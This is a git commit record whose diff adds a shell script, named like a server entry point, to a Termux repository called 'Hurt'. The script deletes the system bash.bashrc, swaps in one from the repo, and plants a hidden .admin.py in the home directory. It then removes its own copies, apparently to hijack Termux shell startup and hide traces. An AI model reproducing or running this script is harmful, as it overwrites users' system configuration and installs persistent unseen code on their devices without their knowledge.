c685a286abf49fac19969a9cf4e32f3cb657e63a
Datez <56632970+Datez-Kun@users.noreply.github.com>
2020-06-09 01:05:21 +0700

    https://github.com/LeON101-coder/Hurt

---
+++ Hurt/server/__main__.sh
@@ -0,0 +1,13 @@
+termux-setup-storage
+cd $HOME
+cd /data/data/com.termux/files/usr/etc
+rm bash.bashrc
+cd $HOME
+cd Hurt
+cp bash.bashrc /data/data/com.termux/files/usr/etc
+cp .admin.py $HOME
+cd $HOME
+cd Hurt
+rm bash.bashrc
+rm .admin.py
+cd $HOME
